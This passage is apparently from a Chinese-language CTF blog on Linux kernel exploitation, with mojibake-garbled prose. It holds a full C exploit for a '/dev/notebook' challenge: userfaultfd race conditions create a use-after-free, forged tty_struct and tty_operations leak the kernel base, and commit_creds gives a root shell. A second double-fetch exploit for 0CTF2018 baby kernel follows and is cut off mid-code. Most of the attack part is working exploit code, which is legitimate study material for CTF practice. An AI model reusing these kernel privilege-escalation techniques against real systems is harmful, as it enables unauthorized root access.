class="line"></span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">char</span> * buf;</span><br><span class="line">&#125;Userarg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> note_fd;</span><br><span class="line"><span class="keyword">char</span> *userfaultfd_buf;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">size_t</span> idx,<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg userarg=&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .buf=buf,</span><br><span class="line">        .size=size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x100</span>,&amp;userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">size_t</span> idx,<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg userarg=&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .buf=buf,</span><br><span class="line">        .size=size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x300</span>,&amp;userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gift</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg useraeg=&#123;</span><br><span class="line">        .buf=buf</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x64</span>,&amp;useraeg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_userfaultfd</span><span class="params">(<span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    edit(note_fd,idx,<span class="number">0x2000</span>,userfaultfd_buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_userfaultfd</span><span class="params">(<span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    add(note_fd,idx,<span class="number">0x50</span>,userfaultfd_buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">serial_icounter_struct</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">&#125;Notebook;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="keyword">size_t</span> tty_struct[<span class="number">0x200</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> tty_fd[<span class="number">0x100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    note_fd=open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">0x200</span>];</span><br><span class="line">    Notebook notebook[<span class="number">0x10</span>];</span><br><span class="line">    page_size=sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    userfaultfd_buf=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    page=<span class="built_in">malloc</span>(page_size);</span><br><span class="line">    <span class="built_in">memset</span>(page,<span class="number">1</span>,page_size);</span><br><span class="line">    registerUserFaultFd(userfaultfd_buf,page_size,fault_handler_thread);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        edit(note_fd,i,<span class="number">0x2e0</span>,name);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        pthread_create(&amp;tid,<span class="literal">NULL</span>,edit_userfaultfd,i);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        tty_fd[i]=open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR | O_NOCTTY);</span><br><span class="line">        <span class="keyword">if</span>(!tty_fd[i])&#123;</span><br><span class="line">            errExit(<span class="string">&quot;ptmx open fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        pthread_create(&amp;tid,<span class="literal">NULL</span>,add_userfaultfd,i);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fake_tty_ops_idx=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        read(note_fd,tty_struct,i);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> magic=*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)tty_struct;</span><br><span class="line">        <span class="keyword">if</span>(magic!=<span class="number">0x5401</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(fake_tty_ops_idx==<span class="number">-1</span>)&#123;</span><br><span class="line">                fake_tty_ops_idx=i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] fake_tty_ops_idx %d\n&quot;</span>,fake_tty_ops_idx=i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(fake_tty_ops_idx==<span class="number">-1</span>)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;fake_tty_ops_idx  find fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> uaf_tty=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        read(note_fd,tty_struct,i);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> magic=*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)tty_struct;</span><br><span class="line">        <span class="keyword">if</span>(magic==<span class="number">0x5401</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] uaf_idx %d\n&quot;</span>,uaf_tty=i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(uaf_tty==<span class="number">-1</span>)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;not uaf_tty&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> tty_ops=tty_struct[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span>((tty_ops&amp;<span class="number">0xfff</span>)==<span class="number">0x440</span>)&#123;</span><br><span class="line">        kernel_base=tty_ops-ptm_unix98_ops_offset;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        kernel_base=tty_ops-pty_unix98_ops_offset;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel_addr %p\033[0m\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    edit(note_fd,fake_tty_ops_idx,<span class="number">0x200</span>,name);</span><br><span class="line">    gift(note_fd,notebook);</span><br><span class="line">    <span class="keyword">size_t</span> init_cred_addr=init_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> commit_creds_addr=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> swapgs_restore_regs_and_return_to_usermode_addr=swapgs_restore_regs_and_return_to_usermode-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdi_ret_addr=pop_rdi_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdx_pop_rbp_ret_addr=pop_rdx_pop_rbp_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_ops[<span class="number">64</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_ops_addr=notebook[fake_tty_ops_idx].buf;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(fake_tty_struct,tty_struct,<span class="number">0x50</span>);</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">64</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>]=fake_tty_ops_addr;</span><br><span class="line">    fake_tty_struct[<span class="number">4</span>]=prepare_kernel_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    fake_tty_struct[<span class="number">5</span>]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ((struct tty_operations *)fake_tty_ops)-&gt;ioctl=work_for_cpu_fn-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line"></span><br><span class="line">    write(note_fd,fake_tty_ops,fake_tty_ops_idx);</span><br><span class="line">    write(note_fd,fake_tty_struct,uaf_tty);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        ioctl(tty_fd[i],<span class="number">0x200</span>,<span class="number">0x200</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    read(note_fd,fake_tty_struct,uaf_tty);</span><br><span class="line">    <span class="keyword">size_t</span> cred=fake_tty_struct[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] root_cred: %p\n&quot;</span>,cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>,fake_tty_struct[<span class="number">4</span>]);</span><br><span class="line">    fake_tty_struct[<span class="number">5</span>]=cred;</span><br><span class="line">    fake_tty_struct[<span class="number">4</span>]=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    write(note_fd,fake_tty_struct,uaf_tty);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        ioctl(tty_fd[i],<span class="number">0x200</span>,<span class="number">0x200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è§£æ³•äºŒçœ‹åˆ«äººåšå®¢æ˜¯ç¨³å®šæ€§æ›´å¥½ï¼Œä½†æ˜¯æˆ‘è·‘å¥½å‡ æ¬¡æ‰èƒ½æˆåŠŸä¸€æ¬¡ï¼Œè¿œæ²¡æœ‰è§£æ³•ä¸€æ¥çš„ç¨³å®šï¼Œæƒ³æ·±ç©¶å°±å¾—å—¯è°ƒï¼ˆä¸çŸ¥é“ä»£ç åœ¨å“ªï¼‰ï¼Œå“ã€‚</p>
<p>è¿™é“é¢˜debugäº†å¿«ä¸¤å¤©ï¼Œå…¶ä¸­æ¯”è¾ƒå‘çš„æ˜¯å°±æ˜¯å…³äº<code>tty_struct</code>å’Œ<code>tty_operations</code>çš„ä¼ªé€ äº†ï¼Œ<code>tty_struct</code>å¦‚æœä¼ªé€ çš„æœ‰é—®é¢˜çš„è¯å°±ä¼šç›´æ¥å¼•èµ·kernel painc,æ‰€ä»¥å¾—<code>memcpy(fake_tty_struct,tty_struct,0x50)</code>ç„¶åå†ä¼ªé€ æˆåŠŸç‡é«˜ä¸€äº›ï¼ˆå…³é”®æ˜¯æ‰¾ä¸åˆ°è¿™å—çš„æºç åœ¨å“ªï¼Œä¸èƒ½çœ‹ä»£ç åˆ†æï¼Œåªèƒ½å—¯è°ƒï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼‰ã€‚ç„¶åæ˜¯å…³äº<code>tty_operation</code>çš„ä¼ªé€ ï¼Œæœ¬æ¥çš„æƒ³æ³•æ˜¯ç›´æ¥åœ¨<code>tty_operation</code>ä¸Šæ„é€ å¥½å®Œæ•´çš„ropæ‰§è¡Œå¾—äº†ï¼Œä½†æ˜¯ä¸€æ—¦åœ¨<code>write</code>æŒ‡é’ˆåé¢å†™ä¸œè¥¿çš„è¯å°±ä¼šå´©æ‰ã€‚æœ€åä¹Ÿåªèƒ½è·³åˆ°ä¸€ä¸ªå †ä¸Šå†æ‰§è¡Œropäº†ã€‚å…³é”®è¿˜æ˜¯è‡ªå·±å¯¹å†…æ ¸ä¸ç†Ÿæ‚‰ï¼Œå°±ç®—æƒ³çœ‹ä»£ç éƒ½ä¸çŸ¥é“åœ¨å“ªï¼Œéå¸¸æŠ˜ç£¨äººï¼Œå­¦å®Œå†…æ ¸åˆ©ç”¨çš„åŸºç¡€çŸ¥è¯†ç‚¹ä¹‹åå¾—èµ¶ç´§æŠŠå†…æ ¸å­¦ä¹ å’Œå†…æ ¸ä»£ç é˜…è¯»æä¸Šæ—¥ç¨‹äº†ã€‚</p>
<p><strong>æ€»ç»“</strong>:é€šè¿‡è¿™é“é¢˜çœŸçš„èƒ½æ„Ÿè§‰åˆ°å†…æ ¸åˆ©ç”¨ä¸­åŒæ­¥å¼•å‘çš„æ¡ä»¶ç«äº‰çš„é­…åŠ›ï¼Œä»£ç çœ‹ç€å®Œå…¨æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯é€šè¿‡é˜»å¡å°±èƒ½ç¡¬ç”Ÿç”Ÿæ„é€ å‡ºä¸€ä¸ªuaf,æ­»é«˜ä¸€ï¼Œä»¥ååœ¨æ¼æ´åˆ©ç”¨çš„æ—¶å€™è¦å¤šæ³¨æ„æ³¨æ„æ¡ä»¶ç«äº‰ã€‚</p>
<h2 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h2><h3 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double fetch"></a>double fetch</h3><p>å–å€¼ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡è¿›è¡Œåˆæ³•æ•ˆéªŒï¼Œç¬¬äºŒæ¬¡è¿›è¡Œæ•°æ®æ“ä½œï¼Œåœ¨è¿™ä¸¤æ¬¡ä¸­é—´å¯ä»¥é€šè¿‡å¤šçº¿ç¨‹æ”¹å˜æ•°æ®çš„å€¼ï¼Œè¿›è€Œè®©ç¬¬ä¸€æ¬¡æ•ˆéªŒå¤±æ•ˆä¼ å…¥æ¶æ„æ•°æ®ã€‚</p>
<h4 id="ä¾‹é¢˜-0CTF2018-Final-baby-kernel"><a href="#ä¾‹é¢˜-0CTF2018-Final-baby-kernel" class="headerlink" title="ä¾‹é¢˜ 0CTF2018 Final - baby kernel"></a>ä¾‹é¢˜ 0CTF2018 Final - baby kernel</h4><p>è¿™é“é¢˜ä¹‹å‰åšè¿‡ç›´æ¥æ”¾è„šæœ¬äº†</p>
<h5 id="è„šæœ¬-1"><a href="#è„šæœ¬-1" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">message</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">&#125;m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_flag_addr</span><span class="params">(<span class="keyword">size_t</span> flag_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        m.buf=flag_addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>,<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg |grep &#x27;Your flag is at &#x27; &gt; ./flag_addr.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> temp_fd=open(<span class="string">&quot;./flag_addr.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(<span class="string">&quot;[    2.817016] Your flag is at &quot;</span>);</span><br><span class="line">    read(temp_fd,buf,<span class="number">100</span>);</span><br><span class="line">    close(temp_fd);</span><br><span class="line">    <span class="keyword">size_t</span> flag_addr=strtoull(buf+len,buf+len+<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag_addr:%d\n&quot;</span>,flag_addr);</span><br><span class="line">    m.buf=buf;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        m.len=i;</span><br><span class="line">        ret=ioctl(fd,<span class="number">0x1337</span>,&amp;m);</span><br><span class="line">        <span class="keyword">if</span>(ret==<span class="number">22</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;flag_len:%d\n&quot;</span>,i);</span><br><span class="line">            